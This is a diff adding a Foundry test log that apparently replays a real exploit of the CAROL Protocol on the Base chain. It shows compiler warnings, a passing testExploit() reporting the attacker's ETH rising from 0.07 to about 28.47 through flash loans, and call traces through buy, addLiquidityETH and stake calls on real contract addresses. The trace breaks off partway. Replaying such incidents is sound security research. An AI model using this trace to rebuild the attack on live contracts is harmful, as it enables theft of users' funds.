@@ -1,0 +1,922 @@
+Compiling 21 files with Solc 0.8.10
+Solc 0.8.10 finished in 901.15ms
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+   --> test/CAROLProtocol_exp.sol:154:9:
+    |
+154 |         bytes memory data = abi.encode(uint256(WETH.balanceOf(address(WETH_USDbCV3))));
+    |         ^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> test/CAROLProtocol_exp.sol:151:9:
+    |
+151 |         bytes calldata data
+    |         ^^^^^^^^^^^^^^^^^^^
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> test/CAROLProtocol_exp.sol:67:5:
+   |
+67 |     IWETH private constant WETH = IWETH(payable(0x4200000000000000000000000000000000000006));
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:118:9:
+    |
+118 |         address sender,
+    |         ^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:119:9:
+    |
+119 |         address underlying,
+    |         ^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:122:9:
+    |
+122 |         bytes calldata params
+    |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:134:9:
+    |
+134 |         address[] memory tokens,
+    |         ^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:136:9:
+    |
+136 |         uint256[] memory feeAmounts,
+    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:137:9:
+    |
+137 |         bytes memory userData
+    |         ^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:148:9:
+    |
+148 |         address initiator,
+    |         ^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:151:9:
+    |
+151 |         bytes calldata data
+    |         ^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:159:51:
+    |
+159 |     function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
+    |                                                   ^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:170:19:
+    |
+170 |     function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    |                   ^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:170:52:
+    |
+170 |     function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    |                                                    ^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/CAROLProtocol_exp.sol:170:69:
+    |
+170 |     function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+    |                                                                     ^^^^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for test/CAROLProtocol_exp.sol:ContractTest
+[PASS] testExploit() (gas: 1802490)
+Logs:
+  Exploiter ETH balance before attack: 0.070000000000000000
+  WETH amount after flashloans: 3400.000000000000000000
+  CAROL amount after swap from WETH: 15597126.006409689141027309
+  Exploiter ETH balance after attack: 28.471449434096888262
+
+Traces:
+  [10076] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("base", 7246080 [7.246e6])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], "CAROLProtocol")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0x4200000000000000000000000000000000000006], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(SynapseETHPools: [0x6223bD82010E2fB69F329933De20897e7a4C225f], "SynapseETHPools")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(BalancerVault: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], "BalancerVault")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Kokonut: [0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17], "Kokonut")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH_USDbCV3: [0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18], "WETH_USDbCV3")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH_USDbCV2: [0xB4885Bc63399BF5518b994c1d0C153334Ee579D0], "WETH_USDbCV2")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], "Router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], "CAROL")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [2148590] ContractTest::testExploit()
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 70000000000000000 [7e16])
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Exploiter ETH balance before attack", val: 70000000000000000 [7e16], decimals: 18)
+    ├─ [550782] CAROLProtocol::buy{value: 30000000000000000}(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   ├─ emit NewUser(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0x0049Ef895ebF2d891FD717ae2335B063058b6F7C, param2: 1701281507 [1.701e9])
+    │   ├─ [0] 0x0049Ef895ebF2d891FD717ae2335B063058b6F7C::fallback{value: 6000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─  emit topic 0: 0xe7ac2a83363cbc98b531a28114b346c109a59e277b67b7f455215cf57e16f0c9
+    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │        topic 2: 0x0000000000000000000000000049ef895ebf2d891fd717ae2335b063058b6f7c
+    │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │           data: 0x000000000000000000000000000000000000000000000000001550f7dca700000000000000000000000000000000000000000000000000000000000065677ee3
+    │   ├─ [0] 0xF993aC8C118E3CC16A8C37AcCFdD442B2fd66666::fallback{value: 3000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─ [2504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   └─ ← [Return] 51757342280058124498 [5.175e19], 15820610504161064525238770 [1.582e25], 1701281023 [1.701e9]
+    │   ├─ [16939] CAROL::mint(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 6419047152569698196965 [6.419e21])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], value: 6419047152569698196965 [6.419e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x0000000000000000000000000000000000000000002b3c98759024390381c0b9 → 0x0000000000000000000000000000000000000000002b3df46fbcc3ea5b095e9e
+    │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x0000000000000000000000000000000000000000001c67da8ece31faa1be0c34 → 0x0000000000000000000000000000000000000000001c693688fad1abf945aa19
+    │   │   └─ ← [Stop]
+    │   ├─ [24933] CAROL::increaseAllowance(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 6419047152569698196965 [6.419e21])
+    │   │   ├─ emit Approval(owner: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 6419047152569698196965 [6.419e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x091757392f20ba3d5f9f16821341a5def661a5349c547c810e2488538be770c5: 0 → 0x00000000000000000000000000000000000000000000015bfa2c9fb157879de5
+    │   │   └─ ← [Return] true
+    │   ├─ [150332] Router::addLiquidityETH{value: 21000000000000000}(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], 6419047152569698196965 [6.419e21], 0, 0, CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701281807 [1.701e9])
+    │   │   ├─ [2564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 51757342280058124498 [5.175e19], 15820610504161064525238770 [1.582e25], 1701281023 [1.701e9]
+    │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [11017] CAROL::transferFrom(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 6419047152569698196965 [6.419e21])
+    │   │   │   ├─ emit Approval(owner: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 0)
+    │   │   │   ├─ emit Transfer(from: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 6419047152569698196965 [6.419e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x0000000000000000000000000000000000000000001c693688fad1abf945aa19 → 0x0000000000000000000000000000000000000000001c67da8ece31faa1be0c34
+    │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x0000000000000000000000000000000000000000000d162503911b9f8c6411f2 → 0x0000000000000000000000000000000000000000000d1780fdbdbb50e3ebafd7
+    │   │   │   │   @ 0x091757392f20ba3d5f9f16821341a5def661a5349c547c810e2488538be770c5: 0x00000000000000000000000000000000000000000000015bfa2c9fb157879de5 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [23802] WETH::deposit{value: 20999999999999999}()
+    │   │   │   ├─ emit Deposit(dst: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], wad: 20999999999999999 [2.099e16])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0 → 0x000000000000000000000000000000000000000000000000004a9b6384487fff
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [7801] WETH::transfer(0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 20999999999999999 [2.099e16])
+    │   │   │   ├─ emit Transfer(from: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 20999999999999999 [2.099e16])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0x000000000000000000000000000000000000000000000000004a9b6384487fff → 0
+    │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x000000000000000000000000000000000000000000000002ce470494e12bb8d2 → 0x000000000000000000000000000000000000000000000002ce919ff8657438d1
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [78054] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::mint(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685])
+    │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   └─ ← [Return] 51778342280058124497 [5.177e19]
+    │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   └─ ← [Return] 15827029551313634223435735 [1.582e25]
+    │   │   │   ├─ [2314] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::feeTo() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd, value: 4474743356033787 [4.474e15])
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], value: 11482620124628244810 [1.148e19])
+    │   │   │   ├─ emit Sync(reserve0: 51778342280058124497 [5.177e19], reserve1: 15827029551313634223435735 [1.582e25])
+    │   │   │   ├─ emit Mint(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0: 20999999999999999 [2.099e16], amount1: 6419047152569698196965 [6.419e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0: 0x0000000000000000000000000000000000000000000005fe2be012e73b1b1ab2 → 0x0000000000000000000000000000000000000000000005fecb4a6ed30e857ef7
+    │   │   │   │   @ 10: 0x0000000000000000000000000000000000466b4125b6913fcc65ee152ce4f122 → 0x0000000000000000000000000000000000466ba8eaf7ce4cf52d095bbbbb6ed6
+    │   │   │   │   @ 0xc3e33f1e9f412f3c97c5a37666655e01fa6f390564c94c2be9da409fd5a9bd9e: 0x00000000000000000000000000000000000000000000000a7f57d78443676cf0 → 0x00000000000000000000000000000000000000000000000a7f67bd45a399f7eb
+    │   │   │   │   @ 0xc960b16574e6a744e218eb8dfcd4ffbde2f00db7cf526a61338bc37fa09f430c: 0x0000000000000000000000000000000000000000000005f39d1b6f3aeb0c9568 → 0x0000000000000000000000000000000000000000000005f43c75e5655e446eb2
+    │   │   │   │   @ 9: 0x00000000000000000000000000d0e46617a5591876714fed14e4ee30aee4b7a0 → 0x00000000000000000000000000d0ed3788eec4e7a68de73fb9967c1e597448e8
+    │   │   │   │   @ 8: 0x65677cff0000000d162503911b9f8c6411f2000000000002ce470494e12bb8d2 → 0x65677ee30000000d1780fdbdbb50e3ebafd7000000000002ce919ff8657438d1
+    │   │   │   │   @ 11: 0x0000000000000000000000000024b7bacf75df00714c4d68600b159a8af86162 → 0x0000000000000000000000000024bf5e4606ee9a119810483cc2c359224d9687
+    │   │   │   └─ ← [Return] 11482620124628244810 [1.148e19]
+    │   │   ├─ [55] CAROLProtocol::fallback{value: 1}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 6419047152569698196965 [6.419e21], 20999999999999999 [2.099e16], 11482620124628244810 [1.148e19]
+    │   ├─ emit LiquidityAdded(: 6419047152569698196965 [6.419e21], : 20999999999999999 [2.099e16], : 11482620124628244810 [1.148e19], : 1701281507 [1.701e9])
+    │   ├─  emit topic 0: 0x88811435dce2aab792ba4c40f60d59a6ce83ae5f5e5614e26fe0fa6b42a2a831
+    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │           data: 0x000000000000000000000000000000000000000000000000006a94d74f43000000000000000000000000000000000000000000000000015bfa2c9fb157879de500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065677ee3
+    │   ├─  storage changes:
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c41e: 967 → 968
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c417: 139 → 140
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c418: 471 → 472
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40f: 8227 → 8228
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c415: 9182 → 9183
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40a: 0x0000000000000000000000000000000000000000000000a9f72389057abb1c1e → 0x0000000000000000000000000000000000000000000000a9f938713a070a1c1e
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40e: 5228 → 5229
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe47: 0 → 3000
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c414: 9173 → 9174
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c412: 9059 → 9060
+    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc9d: 0 → 0x0000000000000000000000000000000000000000000000000000000065677ee3
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c41d: 964 → 965
+    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc98: 0 → 0x000000000000000000000000000000000000000000000000006a94d74f430000
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c410: 8978 → 8979
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c40d: 1510 → 1511
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c420: 971 → 972
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c41a: 915 → 916
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c41c: 934 → 935
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe46: 0 → 0x0000000000000000000000000000000000000000000000000000000000278d00
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c419: 827 → 828
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe45: 0 → 0x0000000000000000000000000000000000000000000000000000000065677ee3
+    │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x0000000000000000000001000049ef895ebf2d891fd717ae2335b063058b6f7c
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c413: 9143 → 9144
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c41b: 930 → 931
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c41f: 969 → 970
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c411: 9034 → 9035
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c416: 9191 → 9192
+    │   │   @ 0xade3cbf6f1f5f31f7b7c98f08ecd256d06455181eaa91d2e0250a865af6dfe44: 0 → 0x000000000000000000000000000000000000000000000000006a94d74f430000
+    │   │   @ 0x45b78319396fd6ae775e965506e1b1d13f9a287e2231e3e7df1412d7fee3c408: 0x000000000000000000000000000000000000000000000004d10cb7b86b14f6c7 → 0x000000000000000000000000000000000000000000000004d12208b047bbf6c7
+    │   └─ ← [Stop]
+    ├─ [286781] CAROLProtocol::stake{value: 39000000000000000}(0)
+    │   ├─ [0] 0x0049Ef895ebF2d891FD717ae2335B063058b6F7C::fallback{value: 7800000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─  emit topic 0: 0xe7ac2a83363cbc98b531a28114b346c109a59e277b67b7f455215cf57e16f0c9
+    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │        topic 2: 0x0000000000000000000000000049ef895ebf2d891fd717ae2335b063058b6f7c
+    │   │        topic 3: 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │           data: 0x000000000000000000000000000000000000000000000000001bb60f053f80000000000000000000000000000000000000000000000000000000000065677ee3
+    │   ├─ [0] 0xF993aC8C118E3CC16A8C37AcCFdD442B2fd66666::fallback{value: 3900000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   └─ ← [Return] 51778342280058124497 [5.177e19], 15827029551313634223435735 [1.582e25], 1701281507 [1.701e9]
+    │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   └─ ← [Return] 51778342280058124497 [5.177e19], 15827029551313634223435735 [1.582e25], 1701281507 [1.701e9]
+    │   ├─ [6139] CAROL::mint(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 8344761298340607656216 [8.344e21])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], value: 8344761298340607656216 [8.344e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0x0000000000000000000000000000000000000000002b3df46fbcc3ea5b095e9e → 0x0000000000000000000000000000000000000000002b3fb8ce906050e66cdfb6
+    │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x0000000000000000000000000000000000000000001c67da8ece31faa1be0c34 → 0x0000000000000000000000000000000000000000001c699eeda1ce612d218d4c
+    │   │   └─ ← [Stop]
+    │   ├─ [22933] CAROL::increaseAllowance(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 8344761298340607656216 [8.344e21])
+    │   │   ├─ emit Approval(owner: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 8344761298340607656216 [8.344e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x091757392f20ba3d5f9f16821341a5def661a5349c547c810e2488538be770c5: 0 → 0x0000000000000000000000000000000000000000000001c45ed39c668b638118
+    │   │   └─ ← [Return] true
+    │   ├─ [85848] Router::addLiquidityETH{value: 27300000000000000}(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], 8344761298340607656216 [8.344e21], 0, 0, CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701281807 [1.701e9])
+    │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 51778342280058124497 [5.177e19], 15827029551313634223435735 [1.582e25], 1701281507 [1.701e9]
+    │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   ├─ [6217] CAROL::transferFrom(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 8344761298340607656216 [8.344e21])
+    │   │   │   ├─ emit Approval(owner: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 0)
+    │   │   │   ├─ emit Transfer(from: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 8344761298340607656216 [8.344e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x0000000000000000000000000000000000000000000d1780fdbdbb50e3ebafd7 → 0x0000000000000000000000000000000000000000000d19455c9157b76f4f30ef
+    │   │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x0000000000000000000000000000000000000000001c699eeda1ce612d218d4c → 0x0000000000000000000000000000000000000000001c67da8ece31faa1be0c34
+    │   │   │   │   @ 0x091757392f20ba3d5f9f16821341a5def661a5349c547c810e2488538be770c5: 0x0000000000000000000000000000000000000000000001c45ed39c668b638118 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [21802] WETH::deposit{value: 27299999999999999}()
+    │   │   │   ├─ emit Deposit(dst: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], wad: 27299999999999999 [2.729e16])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0 → 0x0000000000000000000000000000000000000000000000000060fd34925e3fff
+    │   │   │   └─ ← [Stop]
